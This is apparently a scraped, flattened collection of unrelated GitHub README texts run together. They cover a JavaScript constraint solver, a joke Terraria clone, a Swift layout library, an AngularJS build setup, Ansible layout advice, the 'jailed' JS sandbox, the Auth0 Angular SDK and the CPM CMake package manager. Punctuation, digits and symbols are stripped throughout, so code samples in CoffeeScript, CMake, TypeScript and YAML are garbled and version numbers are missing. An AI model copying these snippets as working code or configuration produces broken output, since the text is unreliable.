test and users and bitpshr and projects and cassowary js node nodemodules and intern and client js config tests and intern defaulting to console reporter  and  tests passed if you have a working make  a makefile is provided with a test target that does the same thing the makefile also provides a make build target which generates a new minified bin and c js binary out of the files in src and it requires python and isn t something you should need to do manually as it s not reqired to run tests or use the solver the checked in binary should always be up to date or at some checkpoint which is known good  so use it in your projects instead of the source versions supported runtimes  this refactoring currently runs in chrome firefox  and opera  and safari  and ie  and command line v d shell jsc built into os x rhino java js jar included in checkout this is an unapologetically modern reinterpretation optimized for size low complexity and speed it will not work on old versions of ie configuration  and and log general debugging information c debug false and and true and and default false and and detailed logging c trace false and and true and and default false and and verbose logging c verbose false and and true and and default false and and logging of tableau additions c traceadded false and and true and and default false and and logging of c gc false and and true and and default false current build status  binary versions of the solver that work in both the browser and under node are available in the bin and directory and are updated frequently tests are run on each commit via travis ci pull requests that do not include tests or break the build will be denied or reverted respectively todo slightlyoff show

71001215, discussed on hacker back when i was first learning to program in java i decided to try to make a clone of the excellent pc game terraria of course i was convinced that my version would have many more features than the official one but before i realized how silly that idea was i produced  lines of to date the most atrocious code i have ever seen in my life i make it available here mostly as a cautionary tale of what can happen if you don t pay attention to the quality of your code lesson learned in my case here are some of the highlights blocks and items among many other things are represented by magic numbers instead of enums there are  lines of block comments at the top of terrariaclone java that serve as manual translation tables there are no access modifiers everything is package private so as to avoid needing to declare local variables and loop indices all of the variables for everything are declared globally at the class level here is one of the several hundred lines of declarations in terrariaclone java int x y i j k t wx wy lx ly tx ty twx twy tlx tly ux uy ux uy uwx uwy uwx ulx uly ulx uly ucx ucy uclx ucly pwx pwy icx icy n m dx dy dx dy mx my lsx lsy lsn ax

terrariaclone  which spans over  lines of code the terrariaclone init method which is over  lines long actually grew so large that it hit the limit hardcoded into the java compiler for the maximum memory that can be taken up by a single function the solution copy half of the init code into a new method called codetoolarge  and call that from init frankly horrifying inline data tables static

and arraylists with magic numbers and strings one by one the control flow is so labyrinthine that some of the code is actually indented by  tabs forget the  column rule these lines don t even start

there are random print statements scattered throughout the codebase with helpful messages like debugr and debuga why use a pre existing gui framework for your text boxes when you can easily roll your own char c  if key getkeycode key vkq c q if queue  if c q c q  now when importing this project into version control you thought i was using version control when i wrote this  i did fix a few of the most blatantly horrible style violations for instance i normalized the whitespace although other improvements for example removing the over  cases of unnecessary boxing have been reverted by popular demand in the name of historical integrity i also tried to get the main game actually working which meant fixing a few resource path issues unfortunately it s only working in the academic sense since it s so slow that you only get about   fps and it crashes when you click the mouse button but somewhere in there is a working game you know sort of mkdir p out javac d out src and java java cp out textures terrariaclone as mentioned previously although it runs it fails to run very well see this pull request fix bugs this project was originally called terraframe back when i created it in  i believe the reasoning was that it was a terra ria clone and it was in a j frame yes it s stupid much like every other part of this project meanwhile there is a completely unrelated company called terraframe this led to an unfortunate misunderstanding wherein somebody thought that this garbage heap of a codebase was associated in some way with terraframe the company after receiving a very polite email pointing out the issue i ve changed the name to something that makes more sense terrariaclone you may notice a subdirectory named python what is this you ask why nothing other than the original version of terrariaclone from before i rewrote it into java and yes it s even more primitive although i at least had a bit more understanding of idiomatic programming in python than in java

convenience methods wrapping lots of annoying and tedius frame algebra into a human readable format because of this it s lightweight and flexible enough to allow you to build great looking ui s

be laid out many ui layouts start with a view anchored to the top and corner of the screen such as a profile view with an avatar in the top left corner doing something like this is easy with fa ade simply tell the view where to anchor itself and provide the applicable padding and size parameters and it will do the rest for you doing this in viewwilllayoutsubviews also allows fa ade to keep this

situation i invested quite some time looking at screenshot after screenshot from countless mobile apps to see how each view lays out its components and in trying to keep the api as simple as possible certain assumptions are made that in my opinion will be sufficient for the vast majority of mobile uis  but your mileage may vary i ve almost certainly missed implementing methods that might also be commonly used and if i did please open an issue or a pull request i know the apis are quite verbose this is by design i intentionally chose readability clarity and specificity over succinctness because in this case i feel choosing the methods you ll need to achieve your desired goals will be easier as you won t need to rely on the documentation and maintenance will be much more pleasnt as anyone looking at the code will very quickly know exactly that it means if you want to contribute open a pull request please do your best to keep the style and formatting consistent with the current project and make sure to add tests if you have questions feature requests etc  i would prefer if you created an issue rather than email me directly this project is made available under the mit license

any coffee less jade or html file changes when changes are detected the files will be linted compiled and ready for you to refresh the browser angularfun is a by product of my learning angularjs and became the reference architecture to my day job project a very large internally and externally facing application with extensive user interactions i needed something that could support our architecture principles including scale stability and maintenance here s an early example controller in coffeescript coffee define controllers and controllers  services and githubservice  controllers controllers controller githubcontroller  scope  location  githubservice  scope location githubservice scope search searchterm location path and github and searchterm scope onroutechange routeparams scope searchterm routeparams searchterm githubservice get scope searchterm  repos scope repos repos there are a couple things going on here requirejs is loading controllers and controllers and services and githubservice and providing a handle to both the controllers module was an early attempt at organizing angularjs functionality into separate angularjs modules i e controllers services directives filters and responseinterceptors this ultimately provided no benefit so i got rid of them they were just noise using only one angularjs module and rewriting the above script without the functionality specific angularjs container modules we have coffee define libs and angular  services and githubservice  angular angular module app controller githubcontroller  scope  location  githubservice  scope location githubservice scope search searchterm location path and github and searchterm scope onroutechange routeparams scope searchterm routeparams searchterm githubservice get scope searchterm  repos scope repos repos as you can see i now had to bring in a reference to libs and angular this was a dependency for controllers and controllers let s now focus on the githubservice dependency the file needs to be loaded of course but requirejs doesn t need to provide a handle to it since angularjs will do that part notice there s no githubservice parameter in the define callback but something just didn t sit well with me requirejs will load dependent files and provide a handle to them beautifully however angularjs has its own dependency management system but there is a difference angularjs does not load dependent files but it will provide a handle to them once they are loaded requirejs does both so the define function is making sure angularjs is loaded and provides a handle to it even though it s a global variable it also makes sure githubservice is loaded but doesn t need to provide a handle since the angularjs dependency management system will do this even though there is a difference there is some overlap in responsibility here this can be observed with the mere fact that there is a githubservice dependency referenced in the define function as well as the controller function so the developer has to work in the requirejs world and angularjs world in the same file so i decided to refactor the files and remove requirejs completely at least from the individual files now we have coffee angular module app controller githubcontroller  scope  location  githubservice  scope location githubservice scope search searchterm location path and github and searchterm scope onroutechange routeparams scope searchterm routeparams searchterm githubservice get scope searchterm  repos scope repos repos to me this just feels better the file contains only angularjs business albeit i did choose to use a single angularjs application module called app and accept the use of the angular global variable so if we ve removed requirejs from the files how do we load the files to let angularjs do its thing i really don t care for including multiple script references in the index html file such as although this may be suitable for some i m not comfortable with ensuring load order by where the script references are placed the angular script reference must precede angular resource for example i prefer to be more prescriptive than that since we no longer have dependencies referenced in individual files by way of requirejs and the multiple script reference idea is unappealing we can define our dependencies inside our main file using shim notice the dependencies can be referenced in any order requirejs will ensure dependencies are loaded prior to their being required coffee controllers and githubcontroller deps libs and angular  app  services and githubservice libs and angular resource deps libs and angular services and githubservice deps libs and angular  app  libs and angular resource  services and messageservice services and messageservice deps libs and angular  app app deps libs and angular  libs and angular resource bootstrap deps libs and angular  app require controllers and githubcontroller  require require bootstrap the bootstrap file is requested within the callback since it must load last now we only need a single script reference inside index html so what about concatenation and minification since we re only using requirejs to manage load order we can leverage the requirejs optimizer to concatenate and minify too and once the files are concatenated and minified to a single file we no longer need requirejs this is perfect for our prod build we do however need to introduce a condition in index html to use the non optimized files or the optimized files based on the build environment the build will do it for us here are the final index html script references note that the condition will not be part of the final output if config environment prod else so that s actually where we are the shim file from

31368225, if infrastructures are to be treated as a code than projects that manage them must be treated as software projects as your infrastructure code gets bigger and bigger you have more problems to deal with code layout variable precedence small hacks here and there therefore the organization of your code is very important and in this repository you can find some of the best practices in our opinion to manage your infrastructure code problems that are addressed are overall organization how to manage external roles usage of variables staging complexity of plays encryption of data e g passwords certificates installation of ansible and module dependencies do not manage external roles in your repository manually use ansible galaxy do not use pretask task or posttasks in your play use roles to reuse the code keep all your variables in one place if possible do not use variables in your play use variables in the roles instead of hard coding keep the names consistent between groups plays variables and roles different environments development test production must be close as possible if not equal do not put your password or certificates as plain text in your git repo use ansible vault for encrypting use tags in your play keep all your ansible dependencies in a single place and make the installation dead simple this is the directory layout of this repository with an explanation production ini inventory file for production stage development ini inventory file for development stage test ini inventory file for test stage vpass ansible vault password file this file should not be committed into the repository therefore file is in ignored by git groupvars and all and variables under this directory belongs all the groups apt yml ansible apt role variable file for all groups webservers and here we assign variables to webservers groups apt yml each file will correspond to a role i e apt yml nginx yml postgresql and here we assign variables to postgresql groups postgresql yml each file will correspond to a role i e postgresql postgresql password yml encrypted password file plays and ansible cfg ansible cfg file that holds all ansible config webservers yml playbook for webserver tier postgresql yml playbook for postgresql tier roles and rolesrequirements yml all the information about the roles external and all the roles that are in git or ansible galaxy roles that are in rolesrequirements yml file will be downloaded into this directory internal and all the roles that are not public extension and setup and all the setup files for updating roles and ansible dependencies it is a bad habit to manage the roles that are developed by other developers in your git repository manually it is also important to separate them so that you can distinguish those that are external and can be updated vs those that are internal therefore you can use ansible galaxy for installing the roles you need at the location you need by simply defining them in the rolesrequirements yml src anxs build essential version v   roles can be downloaded and updated with this command and extensions and setup and roleupdate sh this command will delete all external roles and download everything from scratch it is a good practice as this will not allow you to make changes in the roles if you want to take the advantage of the roles you have to keep your plays simple therefore do not add any tasks to your main play your play should only consist of the list of roles that it depends on here is an example name postgresql yml and all roles hosts postgresql sudo true role common tags common role anxs postgresql tags postgresql as you can see there are also no variables in this play you can use variables in many different ways in ansible and to keep it simple and easier to maintain do not use variables in plays furthermore use tags they give wonderful control over role execution most likely you will need different stages e g test development production for the product you are either developing or helping to develop a good way to manage different stages is to have multiple inventory files as you can see in this repository there are three inventory files each stage you have must be identical as possible that also means you should try to use few as possible host variables it is best to not use at all variables are wonderful they allow you to use all this existing code by just setting some values ansible offers many different ways to use variables however soon as your project starts to get bigger and more you spread variables here and there more problems you will encounter therefore it is good practice to keep all your variables in one place and this place happen to be groupvars they are not host dependent so it will help you to have a better staging environment as well furthermore if you have internal roles that you have developed keep the variables out of them as well so you can reuse them easily if you want to maintain your code keep the name consistent between your plays inventories roles and group variables use the name of the roles to separate different variables in each group for instance if you are using the role nginx under webservers play variables that belong to nginx should be located under groupvars and webservers and nginx yml what this effectively means is that groupvars supports directory and every file inside the group will be loaded you can of course put all of them in a single file as well but this is messy therefore don t do it to decrypt the file you need the vault password which you can place in your root directory but it must not be committed to your git repository you should share the password with your coworkers with some other method than committing to git a repo as it should be very easy to set up the work environment all required packages that ansible needs as well as ansible should be installed very easily this will allow newcomers or developers to start using ansible project very fast and easily therefore pythonrequirements txt file is located at extensions and setup and pythonrequirements txt this structure will help you to keep your dependencies in a single place as well as making it easier to install everything including ansible all you have to do is to execute the setup file and extensions and setup and setup sh code in this repo is functional and tested to run it you need to install ansible and all the dependencies you can do this simply by executing and extensions and setup and setup sh if you already have ansible and you do not want to go through the installation simply create a vpass text file in the root directory and add the secret code  to install roles execute the roleupdate sh which will download all the roles and extensions and setup and roleupdate sh go to the plays directory and then execute the following command do not forget to change the host address in the development ini ansible playbook i and development ini webservers yml mit license

23206986, jailed  flexible js sandbox  jailed is a small javascript library for running untrusted code in a sandbox the library is written in vanilla js and has no dependencies with jailed you can load an untrusted code into a secure sandbox export a set of external functions into the sandbox the untrusted code may then interract with the main application by directly calling those functions but the application owner decides which functions to export and therefore what will be allowed for the untrusted code to perform the code is executed as a plugin  a special instance running as a restricted subprocess in node js  or in a web worker inside a sandboxed frame in case of web browser environment the iframe is created locally so that you don t need to host it on a separate sub domain you can use jailed to setup a safe environment for executing untrusted code without a need to create a sandboxed worker and subprocess manually do that in an isomorphic way the syntax is same both for node js and web browser the code works unchanged execute a code from a string or from a file initiate and interrupt the execution anytime execute user submitted code rd party code and provide it the precise set of functions to harmlessly operate on the part of your application export the particular set of application functions into the sandbox or in the opposite direction  and let those functions be invoked from the other site without a need for manual messaging thus building any custom api and set of permissions for instance and and exported methods will be available to the plugin var api alert alert var plugin new jailed plugin path api plugin js and and runs in a sandboxed worker cannot access the main application and and with except for the explicitly exported alert method and and exported methods are stored in the application remote object application remote alert hello from the plugin exporting the alert method is not that good idea actually under the hood an application may only communicate to a plugin sandboxed worker and jailed subprocess through a messaging mechanism which is reused by jailed in order to simulate the exporting of particular functions each exported function is duplicated on the opposite site with a special wrapper method with the same name upon the wrapper method is called arguments are serialized and the corresponding message is sent which leads to the actual function invocation on the other site if the executed function then issues a callback the responce message will be sent back and handled by the opposite site which will in turn execute the actual callback previously stored upon the initial wrapper method invocation a callback is in fact a short term exported function and behaves in the same way particularly it may invoke a newer callback in reply for the web browser environment  download and unpack the bower install jailed load the jailed js in a preferrable way that is an umd module thus for instance it may simply be loaded as a plain javascript file using the script tag for node js  install jailed with npm npm install jailed and then in your code var jailed require jailed optionally you may load the script from the var jailed require path and to and jailed js after the module is loaded the two plugin constructors are available jailed plugin and jailed dynamicplugin the messaging mechanism reused beyond the remote method invocation introduces some natural limitations for the exported functions and their usage nevertheless the most common use cases are still straightforward exported function arguments may only be either simple objects which are then serialized and sent within a message  or callbacks which are preserved and replaced with special identifiers before sending custom object instance may not be used as an argument a callback can not be executed several times it will be destroyed upon the first invocation if several callbacks are provided only one of them may be called returned value of an exported function is ignored result should be provided to a callback instead in node js the method of a child process object is used for transfering messages which serializes an object into a json string in a web browser environment the messages are transfered via method which implements the structured clone for the serialization that algorithm is more capable than json for instance in a web browser you may send a regexp object which is not possible in node js more details about structured clone algorithm and its comparsion to a plugin object may be created either from a string containing a source code to be executed or with a path to the script to load a plugin code from a file create the plugin using jailed plugin constructor and provide the path and and set of methods to be exported into the plugin var api alert alert var plugin new jailed plugin path api plugin js application remote alert hello from the plugin creating a plugin from a string containing a code is very similar this is performed using jailed dynamicplugin constructor var code application remote alert hello from the plugin var api alert alert var plugin new jailed dynamicplugin code api the second api argument provided to the jailed plugin and jailed dynamicplugin constructors is an interface object with a set of functions to be exported into the plugin it is also possible to export functions in the opposite direction  from a plugin to the main application it may be used for instance if a plugin provides a method to perform a calculation in this case the second argument of a plugin constructor may be omitted to export some plugin functions use application setinterface method in the plugin code and and create a plugin var plugin new jailed plugin path and and called after the plugin is loaded var start function and and exported method is available at this point plugin remote square  reportresult var reportresult function result window alert result is and result and and execute start upon the plugin is loaded plugin whenconnected start plugin js and and provides the method to square a number var api square function num cb and and result reported to the callback cb num num and and exports the api to the application environment application setinterface api in this example the whenconnected plugin method is used at the application site that method subscribes the given function to the plugin connection event after which the functions exported by the plugin become accessible at the remote property of a plugin the whenconnected method may be used as many times as needed and thus subscribe several handlers for a single connection event for additional convenience it is also possible to set a connection handler even after the plugin has already been connected  in this case the handler is issued immediately yet asynchronously when a plugin code is executed a set of functions exported by the application is already prepared but if one of those functions is invoked it will actually be called on the application site if in this case the code of that function will try to use a function exported by the plugin it may not be prepared yet to solve this the similar application whenconnected method is available on the plugin site the method works same as the one of the plugin object the subscribed handler function will be executed after the connection is initialized and a set of functions exported by each site is available on the opposite site therefore if you need to load a plugin and supply it with a set of exported functions simply provide those functions into the plugin constructor and then access those at application remote property on the plugin site  the exported functions are already prepared when the plugin code is exectued if you need to load a plugin and use the functions it provides through exporting set up a handler using plugin whenconnected method on the application site after the event is fired the functions exported by the plugin are available at its remote property of the plugin object if both application and a plugin use the exported functions of each other and the communication is initiated by the plugin you will most likely need to use the application whenconnected method on the plugin site before initiating the communication in order to make sure that the functions exported by the plugin are already available to the application to disconnect a plugin use the disconnect method it kills a worker and subprocess immediately without any chance for its code to a plugin may also disconnect itself by calling the application disconnect method in addition to whenconnected method the plugin object also provides similar whenfailed and whendisconnected methods whenfailed subscribes a handler function to the connection failure event which happens if there have been some error during the plugin initialization like a network problem or a syntax error in the plugin initialization code whendisconnected subscribes a function to the disconnect event which happens if a plugin was disconnected by calling the disconnect method or a plugin has disconnected itself by calling application disconnect  or if a plugin failed to initialize along with the failure event mentioned above after the event is fired the plugin is not usable anymore just like as for whenconnected method those two methods may also be used several times or even after the event has actually been fired jailed was tested and should work in node js and in the following browsers internet explorer  and  edge firefox  and opera  and safari  and chrome  and this is how the sandbox is built a sandboxed is created with its sandbox attribute only set to allow scripts to prevent the content of the frame from accessing anything of the main application origin then a web worker is started inside that frame finally the code is loaded by the worker and executed note when jailed library is loaded from the local source its path starts with file and and  the allow same origin permission is added to the sandbox attribute of the iframe local installations are mostly used for testing and without that permission it would not be possible to load the plugin code from a local file this means that the plugin code has an access to the local filesystem and to some origin shared things like indexeddb though the main application page is still not accessible from the worker therefore if you need to safely execute untrusted code on a local system reuse the jailed library in node js warning according to recent reports sandboxing is not secure any longer the fix is being prepared a node js subprocess is created by the jailed library the subprocess down loads the file containing an untrusted code as a string or in case of dynamicplugin  simply uses the provided string with code then use strict is appended to the head of that code in order to prevent breaking the sandbox using arguments callee caller finally the code is executed using vm runinnewcontext method where the provided sandbox only exposes some basic methods like settimeout  and the application object for messaging with the application site

route can only be visited by authenticated users add the built in authguard type to the canactivate property on the route you wish to protect if an unauthenticated user tries to access this route they

tokens to outgoing requests when using the built in httpclient however you must provide configuration that tells the interceptor which requests to attach access tokens to in order for auth to be able to issue tokens for a specific api we need to configure the audience to inform auth about the api in question set the audience  when calling authmodule forroot  to the api identifier of the api from within your auth dashboard import browsermodule from angular and platform browser import ngmodule from angular and core import appcomponent from and app component and and import the module from the

httpclientmodule note we do not do this automatically for you as we want you to be explicit about including this interceptor also you may want to chain this interceptor with others making it hard for us to place it accurately and and import the interceptor module and the angular types you ll need import httpclientmodule httpinterceptors from angular and common and http import authhttpinterceptor from auth and auth angular and and register the interceptor with your app module in the providers array ngmodule declarations  imports browsermodule httpclientmodule and and register this so that you can make api calls using httpclient approutingmodule authmodule forroot  providers provide httpinterceptors useclass authhttpinterceptor multi true  bootstrap appcomponent  next tell the sdk which requests to attach access tokens to in the sdk configuration these are matched on the url by using a string a regex or more complex object that also allows you to specify the configuration for fetching tokens by setting the tokenoptions property if an http call is made using httpclient and there is no match in this configuration for that url then the interceptor will simply be bypassed and the call will be executed without a token attached in the authorization header note we do this to help prevent tokens being unintentionally attached to requests to the wrong recipient which is a serious security issue those recipients could then use that token to call the api as if it were your application in the event that requests should be made available for both anonymous and authenticated users the allowanonymous property can be set to true when omitted or set to false  requests that match the configuration will not be executed when there is no access token available here are some examples import httpmethod from auth and auth angular and and modify your existing sdk configuration to include the httpinterceptor config authmodule forroot and and the authhttpinterceptor

urimatcher uri uri indexof and api and orders  httpmethod httpmethod post tokenoptions scope write orders   you might want to do this in scenarios where you need the token on multiple endpoints but want to exclude it from only a few other endpoints instead of explicitly listing all endpoints that do need a token a urimatcher can be used to include all but the few endpoints that do not need a token attached to its requests finally make your api call using the httpclient access tokens are then attached automatically in the authorization header export class mycomponent constructor private

calling authservice getaccesstokensilently and authservice getaccesstokenwithpopup  it will emit the corresponding error in the authservice error observable if you want to interact to these errors subscribe to the error observable and act accordingly ngoninit this authservice error subscribe error and and handle error here a common reason you might want to handle the above errors emitted by the error observable is to re login the user when the sdk throws a loginrequired error ngoninit this authservice error pipe filter e e instanceof genericerror e error loginrequired  mergemap this authservice loginwithredirect subscribe instead of using authmodule forroot to specify auth configuration you can provide a factory function using appinitializer to load your config from an external source before the auth module is loaded and provide your configuration using authclientconfig set the configuration will only be used initially when the sdk is instantiated any changes made to the configuration at a later moment in time will have no effect on the default options used when calling the sdk s methods this is also the reason why the dynamic configuration should be set using an appinitializer  because doing so ensures the configuration is available prior to instantiating the sdk informationsource any request made through an instance of httpclient that got instantiated by angular will use all of the configured interceptors including our authhttpinterceptor because the authhttpinterceptor requires the existence of configuration settings the request for retrieving those dynamic configuration settings should ensure it s not using any of those interceptors in angular this can be done by manually instantiating httpclient using an injected httpbackend instance and and app module ts and and import authmodule authclientconfig from auth and auth angular and and provide an initializer function that returns a promise function configinitializer handler httpbackend config authclientconfig return new httpclient handler get and config topromise then loadedconfig any config set loadedconfig and and set the config that was loaded asynchronously here and and provide appinitializer with this function note that there is no config passed to authmodule forroot imports and and other imports httpclientmodule authmodule forroot  and and don t pass any config here providers provide appinitializer usefactory configinitializer and and pass your initializer function here deps httpbackend authclientconfig  multi true if your application uses multiple oauth providers you may need to use multiple callback paths as well one for each oauth provider to ensure the sdk does not process the callback for any provider other than auth configure the authmodule by setting the skipredirectcallback property as follows authmodule forroot skipredirectcallback window location pathname and other callback  note in the above example and other callback is an existing route that will be called by any other oauth provider with a code or error in case something went wrong and state using organizations you can represent teams business customers partner companies or

12834577, note cpm is not being actively maintained i plan on keeping the website active but don t plan on making further modifications to the codebase if anyone is interested in moving the project forward please contact me iauns by sending an e mail or opening an issue a c and and package manager based on cmake and git cpm is designed to promote small well tested composable c and and modules cpm allows you to link against multiple different versions of the same static library without symbol conflicts you can include other c and and modules that may depend on older or newer versions of the same modules you are using additionally cpm will automatically download and build c and and modules for you to you can manage c or c and and libraries that do not utilize cpm a number of external modules are already listed on the website these modules abstract away the details of downloading building and linking against various projects just be aware that you cannot statically link against multiple different versions of these external modules because they are not built as cpm modules and do not manage symbols like real cpm modules do for an example of a module with various interdependencies check out example dependency graph that the cpm website automatically generated for this table of contents brief example  below is a sample of a cmakelists txt file that uses  modules these modules are platform specific opengl headers an axis aligned bounding box implementation and g truc s glsl vector math library see the next section for a full explanation of how to use

cpm modules  todo include any modules here cpmfinish then add the cpmlibraries variable to your targetlinklibraries similar to the following targetlinklibraries myproject cpmlibraries and you re done you will be able to start using cpm modules right away by adding the following snippet to the cpm modules section of your cmakelists txt cpmaddmodule aabb gittag    this snippet will automatically download build and link version    of a simple axis aligned bounding box implementation named aabb a new namespace is generated for aabb and a preprocessor definition for this namespace is automatically added to your project the preprocessor namespace definition always follows the form cpm name ns where name is the capitalized first argument of your call to cpmaddmodule for example in the aabb snippet above the first argument to cpmaddmodule was aabb so the preprocessor definition cpmaabbns would be added to our project this declares the namepsace under which cpm has bound the aabb module for instance aabb s only class is named aabb so the fully qualified name for the aabb class would be cpmaabbns aabb you may want to rename the namespace to something more appropriate namespace glmaabb cpmaabbns but that s entirely up to you depending on your needs using the cpm namespace as is may be all you need be sure to place all calls to cpmaddmodule before your call to cpmfinish the todo include any modules here section mentioned in the first snippet indicates where you should place calls to cpmaddmodule why even bother with these preprocessor namespace definitions the reason is so that we can leverage multiple different versions of a single cpm module in the same static linkage unit why would we want to let users utilize multiple versions of our module in the first place in many cases users won t know that they are actually using multiple different versions of your module for example a more recent version of your module may be included directly by the user but an older version of your module may be pulled in as a dependency of another module the user is relying on if you re interested you can see cpm s dependency graph dependency hierarchy for your project things to note  every module s root directory will be added to your include path it is common that every module s github page describes what file or files you should include in your project the paths to these files will be relative to the module s root directory so you can copy the include directive directly from the module s github page into your code for example to access aabb s functionality we would include its interface header file like so if you have compiler flags you wish to apply to all modules then add them directly before the cpm section in your cmakelistst txt since each call to cpmaddmodule uses addsubdirectory internally every module will inherit your compiler flags for good or bad if the library you are interested in isn t a cpm module try browsing through would with any other module note that you will likely want to use the useexistingver parameter to cpmaddmodule in conjunction with external if you don t find a formula for your favorite library kindly consider contributing one to our cpm modules repository while it may be tempting to use the origin and master tag to track the most recent changes to a module it is not recommended using version tags for a module such as    and upgrading modules when necessary will save you time in the long run if you track origin and master and upstream decides to release a major version which includes significant api changes then your builds will likely break immediately but if versioned tags are used you will maintain your build integrity even through upstream version upgrades automatically manages code retrieval and building of cpm modules and externals allows the use of multiple different versions of the same statically linked module in the same executable built entirely in cmake nothing else is required all cpm module code will be included in any generated project solution will automatically detect preprocessor naming conflicts optionally cache downloaded modules and repositories to a central directory only supports git with very limited support for svn building cpm modules  if you only want to use pre existing cpm modules and aren t interested in building modules yourself feel free to skip this section but if you are interested in building cpm modules then please read on as some guidelines and requirements are listed below cmakelists txt entry  there must be a cmakelists txt at the root of your module project and this cmakelists txt file must contain all relevant cpm directives and code see below do not use issue calls to cpm cpm in a subdirectory addsubdirectory add the following to the top of the cmakelists txt for your module  cpm configuration  set cpmmodulename name set cpmlibtargetname cpmmodulename if defined cpmdir and defined cpmuniqueid and defined cpmtargetname set cpmlibtargetname cpmtargetname set cmakemodulepath cmakemodulepath cpmdir include cpm set cpmdir cmakecurrentbinarydir and cpm packages cache type string findpackage git if not gitfound message fatalerror cpm requires git endif if not exists cpmdir and cpm cmake executeprocess resultvariable errorcode outputquiet errorquiet if errorcode message fatalerror cpm failed to get the hash for head endif endif include cpmdir and cpm cmake endif include cpm modules or externals here with cpmaddmodule cpminitmodule cpmmodulename be sure to update the name at the beginning of the snippet name is placed in the namespace preprocessor definition for your module for example if name is spire then the preprocessor definition that will be added to your project will be cpmspirens use this definition as a wrapper around your code and namespaces don t worry about users using the same name in their call to cpmaddmodule as the name you choose in your call to cpminitmodule cpm will automatically handle this for you also use cpmlibtargetname as the name of your library in addlibrary and include cpmlibraries in targetlinklibraries for your static library example our cpm module library addlibrary cpmlibtargetname source targetlinklibraries cpmlibtargetname cpmlibraries here is an example class that demonstrates the namespace wrapping namespace cpmspirens code here and and namespace cpmspirens library target name  if you used the code snippet above make sure that your generated library target name is cpmlibtargetname this will ensure your library target name matches with what cpm is expecting but if you can t name your target cpmlibtargetname for any reason use cpmexportadditionallibrarytarget instead in order name your target whatever you would like see the function reference below wrapping namespace  cpm allows multiple different versions of the same module to be statically linked into the same target as such when you are building a module for cpm not when you are using cpm modules  you should either surround your top level namespaces in cpm module name ns tags or use cpm module name ns as your top level namespace like so namespace cpm module name ns  and and namespace cpm module name ns the first argument given to cpminitmodule becomes module name in your application note that this is not required but it is heavily recommended when you are building cpm modules you must include this if you want your users to be able to use multiple versions of your module within the same static linkage unit directory structure  in order to avoid header name conflicts cpm modules adhere to the directory following structure root of module name and cmakelists txt and test and module name and public headers go here and src and private headers and source code using this structure users would include your public headers using include module name and interface h exporting build info  by default the root of your project is added to the include path if you need to expose more directories to the consumer of your module use the cpmexportadditionalincludedir function to add directories to the consumer s include path the first and only argument to cpmexportadditionalincludedir is the directory you want to add to the path be sure to clearly document any changes you make to the include path in your module s readme just as with the include paths above you can set preprocessor definitions for the consumer use the function cpmexportadditionaldefinition  like below cpmexportadditionaldefinition dmongohavestdint if you have additional targets or don t want to use the target name that cpm generates for you you can use the cpmexportadditionallibrarytarget function that comes with cpm cpmexportadditionalibrarytarget mytargetname this target will be added to the targetlinklibraries call issued by the consumer of your module registering your module  once you have finished writing your module add your repository to the graph will be automatically generated for your module and you will be able to see others using your module note that this step is not mandatory you can use your module without registering it by pointing cpm to the url of your git repository module registration is recommended because it makes it easier for others to find building externals  if you are wrapping non cpm code then you are likely building a cpm external building an external is just like building a module except for a call to cpmforceonlyonemoduleversion somewhere in your module s cmakelists txt file this function ensures exactly one and only one version of your module is ever statically linked in addition to this you should reference the original repository in your cpm modules json file by adding the externalurl key and value pair the key being externalurl and the value being be a url locating the repository for which you have created this external also set the external key to true in your json file so that the cpm website knows you have built an external for an example cpm function reference  all cmake functions that cpm exposes are listed below general purpose  adds a cpm module to your project all arguments except name are optional additionally one of either the gitrepository or sourcedir arguments must be present in your call to cpmaddmodule should be called before either cpmfinish or cpminitmodule cpmaddmodule name required module target name used to generate your preprocessor definition gitrepository repo git repository that corresponds to a cpm module if this argument is not specfied then sourcedir must be set gittag tag git tag to checkout tags shas and branches all work useexistingver truth if set to true and an existing version of this module is found then the existing version of this module is used instead of the version indicated by gittag sourcedir dir uses dir as the source directory instead of cloning from a repo if this is not specified then gitrepository must be specified sourceghostgitrepo repo ghost repository when using sourcedir used to correctly correlate sourcedir modules with their correct upstream repository sourceghostgittag tag ghost git tag when using sourcedir exportmodule truth if true then this module s name definitions and includes will be exported to any consumer of your module forwarddeclaration truth if true then only the module s preprocessor definition that the name argument above is used to generate is exported to the consumer of the module this is useful for situations where you only need to forward declare a module s classes in your interface classes and not actually include the target module s interface headers this is preferred over exportmodule a utility function that allows you to download and ensure that some repository is up to date and present on the filesystem before proceeding forward with cmakelists txt processing useful for building cpm externals you can use this function outside of any call to cpmfinish or cpminitmodule cpmensurerepoiscurrent targetdir dir required directory in which to place repository gitrepository repo git repository to clone and keep up to date gittag tag git tag to checkout svnrepository repo svn repository to checkout svnrevision rev svn revision svntrustcert  trust the subversion server site certificate usecaching  enables caching of repositories if the user has specified cpmmodulecachingdir not enabled by default this function is for the top level application only call when you are finished issuing calls to cpmaddmodule cpmfinish modules only  the functions listed in this section are used exclusively for constructing modules if you use one of these functions in non module code a cmake warning will be generated and the function call will be ignored this function is the module s counterpart to cpmfinish call this to indicate to cpm that you have finished issuing calls to cpmaddmodule the only argument indicates the name of the module this name will only be used for generating the preprocessor definition you should use for your cpminitmodule mymodule when building modules this exports an additional definition in the module consumer s scope use sparingly primarily used to expose mandatory external project definitions cpmexportadditionaldefinition dmydefinition  exposes an additional include directory to the consumer of a module use sparingly primarily used to expose external project directories to module consumers cpmexportadditionalincludedir and foo and bar note for this function do not quote lists of include directories pass the list in as is this function is mostly used to avoid having to name targets per the cpmtargetname convention in cpm for an example of its use see target name when included as a subdirectory so we must use that name cpmexportadditionallibrarytarget mytarget miscellaneous issues and questions  below are some common issues users encounter and solutions to them when are modules downloaded and updated  during the cmake configure step no repository cloning or fetching occurs during the build step exposing foreign module interfaces  some modules require the ability to expose classes from other modules through public headers this is allowed by tagging the module that you plan on exporting with exportmodule true just like cpmaddmodule glm gittag origin and master useexistingver true exportmodule true use exportmodule sparingly we expose glm s interface through our own interface hence why we export it in this case glm s definitions and include paths will be exported to the direct consumer of your module it will not export this module to any parents of your consumer using an existing module version  cpm allows you the flexibility of selecting the most recently used version of a particular module instead of the version you requested this is useful when you are working with externals or modules that require you to only use one version simply add useexistingver true in your call to cpmaddmodule an example of this is given above in the section on exposing foreign module interfaces for example if a module you added lets call this module b requested version v   of module a  and you subsequently requested v   of module a  then your version would be upgraded to v   to comply with the pre existing version of the module if you specified useexistingver true when adding module a it is considered best practice to set useexstingver to true when adding externals not regular modules to your project especially when building modules for others to use but also be aware that your version can be downgraded in the same manner you can generally avoid being downgraded by re arranging the order of your calls to cpmaddmodule when adding regular non external modules you may consider using this option to 